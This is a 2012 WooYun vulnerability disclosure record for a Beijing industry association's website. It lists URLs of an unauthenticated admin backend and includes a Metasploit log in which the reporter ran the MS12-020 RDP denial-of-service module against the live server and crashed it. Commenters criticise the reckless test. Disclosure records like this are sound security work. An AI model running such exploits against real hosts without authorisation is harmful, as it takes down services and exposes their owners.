{"id": 18636, "wybug_id": "wooyun-2012-08500", "wybug_title": "北京市内审协会某后台未授权访问+远程桌面协议RDP拒绝访问漏洞(MS12-020)", "wybug_corp": "北京市内审协会", "wybug_author": "zhk", "wybug_date": "2012-06-19 17:55", "wybug_open_date": "2012-08-03 17:56", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["后台被猜解", "敏感接口缺乏认证", "未授权访问", "管理后台对外", "运维管理不当", "远程拒绝服务", "内部系统对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-03：\t细节向公众公开  简要描述： 北京市内审协会某后台未授权访问 详细说明：  http://www.bjia.org/bjiaportal/http://www.bjia.org/bjiaportal/wafplatform/portletmanage.dohttp://www.bjia.org/bjiaportal/wafplatform/portletmanage.do?funcid=showGroupTree远程桌面协议RDP拒绝访问漏洞(MS12-020)   漏洞证明：  \n\n\nmsf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelidsmsf  auxiliary(ms12_020_maxchannelids) > set rhost www.bjia.orgrhost => www.bjia.orgmsf  auxiliary(ms12_020_maxchannelids) > exploit[*] www.bjia.org:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS[*] www.bjia.org:3389 - 210 bytes sent[*] www.bjia.org:3389 - Checking RDP status...[+] www.bjia.org:3389 seems down //不是好像，而是一定挂了[*] Auxiliary module execution completed\n   修复方案：  加验证，打补丁   版权声明：转载请注明来源 zhk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2012-06-20 09:19 厂商回复： CNVD确认漏洞并复现部分情况，已转由CNCERT国家中心协调北京市信息化主管部门处置。对该漏洞评分如下：CVSS：(AV:R/AC:L/Au:NR/C:N/A:C/I:P/B:N) score:8.47（最高10分，高危）即：远程攻击、攻击难度低、不需要用户认证，对可用性构成完全影响，对完整性构成部分影响。技术难度系数：1.1（多个漏洞）影响危害系数：1.2（一般，涉及行业协会网站，存在运行安全风险）CNVD综合评分：8.47*1.1*1.2=11.180 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-19 18:00 |    \t\t天行健 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 业余信息安全爱好者，没事了玩一玩)\t\t \n  网站打不开，@zhk 你把人家的服务器给重启了么？MS12-020现有的利用工具貌似只能蓝屏重启吧    \n     2012-06-19 18:07 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @天行健 所以叫‘拒绝访问’    \n     2012-06-19 18:16 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @zhk 危险啊，亲    \n     2012-06-19 18:18 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @xsser 不用直接发利用代码好像检测不出来不是吗？    \n     2012-06-19 18:20 |    \t\t天行健 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 业余信息安全爱好者，没事了玩一玩)\t\t \n  @zhk 亲，你搞了就搞了，现在你发出来，坐实了就是你干的.....亲，改天去局子里给你送饭好了....    \n     2012-06-19 18:58 |    \t\tMoments \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:10        | 2)\t\t \n  这可不能瞎玩，你要知道政府的服务器都不重启的，你这一下蓝屏，回头重启 起不来，造成什么通报批评之类的 全是你责任啊 年轻人    \n     2012-06-19 19:20 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  看来以后需谨慎呐    \n     2012-06-19 19:44 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  兄，走好不送    \n     2012-06-19 19:53 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  这个网站好像没人管，到现在还没启动    \n     2012-06-19 22:07 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  哥，确实是不动了。。要不晚上给你确认了吧。    \n     2012-06-19 22:08 |    \t\tcode0day \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:4        | 一步一步来。)\t\t \n  你完蛋了。。政府也敢重启    \n     2012-06-19 22:09 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @cncert国家互联网应急中心 管理员看来罢工了    \n     2012-06-20 00:46 |    \t\tSay \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:4        | 谁又会鉴定谁正常？)\t\t \n  这真是悲剧。。。    \n     2012-06-20 01:50 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @cncert国家互联网应急中心 @xsser 这个缺陷正好再次提醒了我们对漏洞测试时的尺度问题以及在复现的方式和方法上都应该更加谨慎，如果在明知可能引发宕机后果的情况下进行测试是非常不明智的行为。    \n     2012-06-20 02:02 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @zhk 安全宝好像有这个功能(http://lucky.anquanbao.com/)，至于准确率可自行测试    \n     2012-06-20 02:27 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @Z-0ne 谢谢啦    \n     2012-06-20 12:09 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  MS12-020确实是有不蓝屏检测工具的，其检测方法比较巧妙，“通过安全扫描CVE-2012-0152来判断CVE-2012-0002 rdp漏洞的存在，这样可以防止扫描rdp漏洞导致蓝屏的发生”（来源：@vessial ）。检测代码：（1）http://hi.baidu.com/vessial/blog/item/c5f6a0f347fd344f342accf5.html ；（2）http://pastebin.com/1prnaCmd    \n     2012-06-20 12:53 |    \t\t天行健 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 业余信息安全爱好者，没事了玩一玩)\t\t \n  @horseluke 检测都是Cannot check不论本机，远程，打补丁，没打补丁都这个提示    \n     2012-07-10 09:50 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @天行健 可以尝试注释出现can not check的代码试试    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}